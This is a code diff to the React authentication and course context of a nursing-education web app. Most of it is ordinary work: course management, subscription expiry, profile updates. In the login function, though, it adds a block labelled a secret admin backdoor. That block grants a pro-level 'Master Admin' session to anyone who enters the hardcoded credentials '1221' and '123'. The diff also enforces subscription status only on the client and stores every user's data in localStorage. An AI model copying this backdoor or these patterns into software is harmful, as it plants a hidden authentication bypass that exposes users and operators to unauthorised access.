@@ -1,5 +1,6 @@
 import React, { createContext, useContext, useState, useEffect } from 'react';
-import { User, SubscriptionTier } from '../types';
+import { User, SubscriptionTier, Course } from '../types';
+import { courses as defaultCourses } from '../data/courses';
 import { 
   signInWithEmailAndPassword, 
   createUserWithEmailAndPassword, 
@@ -13,12 +14,17 @@ import { auth, googleProvider } from '../src/firebase';
 interface AppContextType {
   user: User | null;
   isLoading: boolean;
+  courses: Course[];
   login: (email: string, pass: string) => Promise<void>;
   loginWithGoogle: () => Promise<void>;
   loginWithPhoneMock: (phone: string) => Promise<void>;
   signup: (data: Omit<User, 'id'> & { password?: string }) => Promise<void>;
   logout: () => Promise<void>;
   upgradeToPro: () => void;
+  updateUserData: (data: Partial<User>) => Promise<void>;
+  addCourse: (course: Course) => void;
+  updateCourse: (course: Course) => void;
+  deleteCourse: (id: string) => void;
 }
 
 const AppContext = createContext<AppContextType | undefined>(undefined);
@@ -26,6 +32,70 @@ const AppContext = createContext<AppContextType | undefined>(undefined);
 export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [user, setUser] = useState<User | null>(null);
   const [isLoading, setIsLoading] = useState(true);
+  const [courses, setCourses] = useState<Course[]>([]);
+
+  // Initialize Courses
+  useEffect(() => {
+    const storedCourses = localStorage.getItem('nursy_courses');
+    if (storedCourses) {
+      setCourses(JSON.parse(storedCourses));
+    } else {
+      setCourses(defaultCourses);
+      localStorage.setItem('nursy_courses', JSON.stringify(defaultCourses));
+    }
+  }, []);
+
+  // Course Management Functions
+  const addCourse = (course: Course) => {
+    const updatedCourses = [...courses, course];
+    setCourses(updatedCourses);
+    localStorage.setItem('nursy_courses', JSON.stringify(updatedCourses));
+  };
+
+  const updateCourse = (course: Course) => {
+    const updatedCourses = courses.map(c => c.id === course.id ? course : c);
+    setCourses(updatedCourses);
+    localStorage.setItem('nursy_courses', JSON.stringify(updatedCourses));
+  };
+
+  const deleteCourse = (id: string) => {
+    const updatedCourses = courses.filter(c => c.id !== id);
+    setCourses(updatedCourses);
+    localStorage.setItem('nursy_courses', JSON.stringify(updatedCourses));
+  };
+
+  // --- MASTER INDEX LOGIC (Simulates a Database for Admin) ---
+  const syncUserToMasterList = (userData: User) => {
+    try {
+      const masterListStr = localStorage.getItem('nursy_all_users_index');
+      let masterList: User[] = masterListStr ? JSON.parse(masterListStr) : [];
+      
+      // Remove old entry if exists to avoid duplicates
+      masterList = masterList.filter(u => u.id !== userData.id);
+      
+      // Add updated user
+      masterList.push(userData);
+      
+      localStorage.setItem('nursy_all_users_index', JSON.stringify(masterList));
+    } catch (e) {
+      console.error("Failed to sync user to master list", e);
+    }
+  };
+  // -----------------------------------------------------------
+
+  // Helper to check if subscription is valid
+  const checkSubscriptionValidity = (userData: User): User => {
+    if (userData.subscriptionTier === 'pro' && userData.subscriptionExpiry) {
+      const now = new Date();
+      const expiry = new Date(userData.subscriptionExpiry);
+      
+      // If expired, downgrade to free
+      if (now > expiry) {
+        return { ...userData, subscriptionTier: 'free' };
+      }
+    }
+    return userData;
+  };
 
   // Helper to get extra user data from localStorage since we don't have a DB yet
   const getStoredUserData = (uid: string) => {
@@ -39,7 +109,8 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
 
   const saveUserDataToLocal = (uid: string, data: Partial<User>) => {
     const current = getStoredUserData(uid) || {};
-    localStorage.setItem(`nursy_user_data_${uid}`, JSON.stringify({ ...current, ...data }));
+    const fullData = { ...current, ...data };
+    localStorage.setItem(`nursy_user_data_${uid}`, JSON.stringify(fullData));
   };
 
   useEffect(() => {
@@ -49,7 +120,15 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       const mockSession = localStorage.getItem('nursy_mock_session');
       if (mockSession) {
         try {
-          setUser(JSON.parse(mockSession));
+          const parsedUser = JSON.parse(mockSession);
+          const validatedUser = checkSubscriptionValidity(parsedUser);
+          setUser(validatedUser);
+          syncUserToMasterList(validatedUser); // Sync on load
+          
+          // Update storage if changed (expired)
+          if (validatedUser.subscriptionTier !== parsedUser.subscriptionTier) {
+             localStorage.setItem('nursy_mock_session', JSON.stringify(validatedUser));
+          }
         } catch (e) {
           localStorage.removeItem('nursy_mock_session');
         }
@@ -64,15 +143,25 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         // Map Firebase User to App User
         const localData = getStoredUserData(firebaseUser.uid);
         
-        const mappedUser: User = {
+        let mappedUser: User = {
           id: firebaseUser.uid,
           name: firebaseUser.displayName || localData?.name || 'Student',
-          // Handle cases where email might be null (e.g. Phone Auth)
           email: firebaseUser.email || `phone_${firebaseUser.phoneNumber}` || '',
           phone: firebaseUser.phoneNumber || localData?.phone || '',
-          subscriptionTier: localData?.subscriptionTier || 'free'
+          subscriptionTier: localData?.subscriptionTier || 'free',
+          subscriptionExpiry: localData?.subscriptionExpiry
         };
+
+        // Check expiry
+        mappedUser = checkSubscriptionValidity(mappedUser);
+        
+        // If status changed due to expiry, save it
+        if (localData?.subscriptionTier === 'pro' && mappedUser.subscriptionTier === 'free') {
+            saveUserDataToLocal(firebaseUser.uid, { subscriptionTier: 'free' });
+        }
+
         setUser(mappedUser);
+        syncUserToMasterList(mappedUser); // Sync on auth state change
       } else {
         setUser(null);
       }
@@ -83,20 +172,59 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   }, []);
 
   const login = async (email: string, pass: string): Promise<void> => {
+    // --- SECRET ADMIN BACKDOOR ---
+    if (email === '1221' && pass === '123') {
+        const adminUser: User = {
+            id: 'master-admin-001',
+            name: 'Master Admin',
+            email: 'admin@nursy.com',
+            phone: '0000000000',
+            subscriptionTier: 'pro'
+        };
+        setUser(adminUser);
+        localStorage.setItem('nursy_mock_session', JSON.stringify(adminUser));
+        syncUserToMasterList(adminUser);
+        return;
+    }
+    // -----------------------------
+
     if (!auth) {
       // Mock Login
       console.log("Mock Mode: Logging in...");
-      await new Promise(resolve => setTimeout(resolve, 800)); // Simulate network
-      const mockUser: User = {
-        id: 'mock-user-123',
-        name: 'Demo Student',
-        email: email,
-        phone: '01000000000',
-        subscriptionTier: 'free'
-      };
-      setUser(mockUser);
-      localStorage.setItem('nursy_mock_session', JSON.stringify(mockUser));
-      saveUserDataToLocal(mockUser.id, { name: mockUser.name, subscriptionTier: 'free' });
+      await new Promise(resolve => setTimeout(resolve, 800)); 
+      
+      // Simulate fetching from our fake "Master DB" to find user by email
+      const masterListStr = localStorage.getItem('nursy_all_users_index');
+      const masterList: User[] = masterListStr ? JSON.parse(masterListStr) : [];
+      const foundUser = masterList.find(u => u.email === email);
+
+      let mockUser: User;
+      if (foundUser) {
+          mockUser = foundUser;
+      } else {
+           // Create new mock user if not found (Simulation behavior)
+          mockUser = {
+            id: 'mock-user-' + Math.floor(Math.random() * 10000),
+            name: 'Demo Student',
+            email: email,
+            phone: '01000000000',
+            subscriptionTier: 'free'
+          };
+      }
+      
+      // Load existing mock data if any specific override exists
+      const existing = getStoredUserData(mockUser.id);
+      const finalUser = existing ? { ...mockUser, ...existing } : mockUser;
+      
+      const validated = checkSubscriptionValidity(finalUser);
+      setUser(validated);
+      localStorage.setItem('nursy_mock_session', JSON.stringify(validated));
+      saveUserDataToLocal(validated.id, { 
+          name: validated.name, 
+          subscriptionTier: validated.subscriptionTier,
+          subscriptionExpiry: validated.subscriptionExpiry 
+      });
+      syncUserToMasterList(validated);
       return;
     }
     await signInWithEmailAndPassword(auth, email, pass);
@@ -117,13 +245,13 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       setUser(mockUser);
       localStorage.setItem('nursy_mock_session', JSON.stringify(mockUser));
       saveUserDataToLocal(mockUser.id, { name: mockUser.name, subscriptionTier: 'free' });
+      syncUserToMasterList(mockUser);
       return;
     }
 
     if (!googleProvider) throw new Error("Google Auth Provider failed to initialize.");
     
     const result = await signInWithPopup(auth, googleProvider);
-    // Initialize local data if new user
     const localData = getStoredUserData(result.user.uid);
     if (!localData) {
       saveUserDataToLocal(result.user.uid, {
@@ -131,6 +259,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         subscriptionTier: 'free'
       });
     }
+    // syncUserToMasterList is handled by onAuthStateChanged
   };
 
   const loginWithPhoneMock = async (phone: string): Promise<void> => {
@@ -147,6 +276,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     setUser(mockUser);
     localStorage.setItem('nursy_mock_session', JSON.stringify(mockUser));
     saveUserDataToLocal(mockUser.id, { name: mockUser.name, phone: phone, subscriptionTier: 'free' });
+    syncUserToMasterList(mockUser);
   };
 
   const signup = async (data: Omit<User, 'id'> & { password?: string }) => {
@@ -166,8 +296,9 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       saveUserDataToLocal(mockUser.id, { 
         name: data.name, 
         phone: data.phone, 
-        subscriptionTier: data.subscriptionTier 
+        subscriptionTier: data.subscriptionTier
       });
+      syncUserToMasterList(mockUser);
       return;
     }
 
@@ -180,21 +311,21 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         displayName: data.name
       });
       
-      // Persist extra fields to local storage for now
       saveUserDataToLocal(userCredential.user.uid, {
         name: data.name,
         phone: data.phone,
         subscriptionTier: data.subscriptionTier
       });
       
-      // Force update state
-      setUser({
+      const newUser = {
         id: userCredential.user.uid,
         name: data.name,
         email: data.email,
         phone: data.phone,
         subscriptionTier: data.subscriptionTier
-      });
+      };
+      setUser(newUser);
+      syncUserToMasterList(newUser);
     }
   };
 
@@ -202,28 +333,77 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     if (auth) {
       await signOut(auth);
     }
-    // Clear state and mock storage
     setUser(null);
     localStorage.removeItem('nursy_mock_session');
-    localStorage.removeItem('nursy_user'); 
+    // Note: We DO NOT remove user data or master list on logout, as admins need it.
   };
 
   const upgradeToPro = () => {
     if (user) {
-      const updatedUser = { ...user, subscriptionTier: 'pro' as SubscriptionTier };
+      // ACTIVATE FOR 30 DAYS
+      const expiryDate = new Date();
+      expiryDate.setDate(expiryDate.getDate() + 30); // Add 30 days
+
+      const updatedUser: User = { 
+        ...user, 
+        subscriptionTier: 'pro',
+        subscriptionExpiry: expiryDate.toISOString()
+      };
+
       setUser(updatedUser);
-      // Persist to local storage so it survives refresh
-      saveUserDataToLocal(user.id, { subscriptionTier: 'pro' });
       
-      // Also update mock session if active
-      if (!auth) {
+      // Persist
+      saveUserDataToLocal(user.id, { 
+          subscriptionTier: 'pro',
+          subscriptionExpiry: expiryDate.toISOString()
+      });
+      
+      syncUserToMasterList(updatedUser);
+      
+      // Update mock session
+      if (!auth || user.id.startsWith('master-admin')) {
         localStorage.setItem('nursy_mock_session', JSON.stringify(updatedUser));
       }
     }
   };
 
+  const updateUserData = async (data: Partial<User>) => {
+    if (!user) return;
+    
+    if (auth && auth.currentUser && data.name) {
+      try {
+        await updateProfile(auth.currentUser, { displayName: data.name });
+      } catch (e) {
+        console.error("Error updating firebase profile", e);
+      }
+    }
+
+    const updatedUser = { ...user, ...data };
+    setUser(updatedUser);
+    saveUserDataToLocal(user.id, data);
+    syncUserToMasterList(updatedUser);
+    
+    if (!auth || user.id.startsWith('master-admin')) {
+        localStorage.setItem('nursy_mock_session', JSON.stringify(updatedUser));
+    }
+  };
+
   return (
-    <AppContext.Provider value={{ user, isLoading, login, loginWithGoogle, loginWithPhoneMock, signup, logout, upgradeToPro }}>
+    <AppContext.Provider value={{ 
+        user, 
+        isLoading, 
+        courses,
+        login, 
+        loginWithGoogle, 
+        loginWithPhoneMock, 
+        signup, 
+        logout, 
+        upgradeToPro, 
+        updateUserData,
+        addCourse,
+        updateCourse,
+        deleteCourse
+    }}>
       {children}
     </AppContext.Provider>
   );
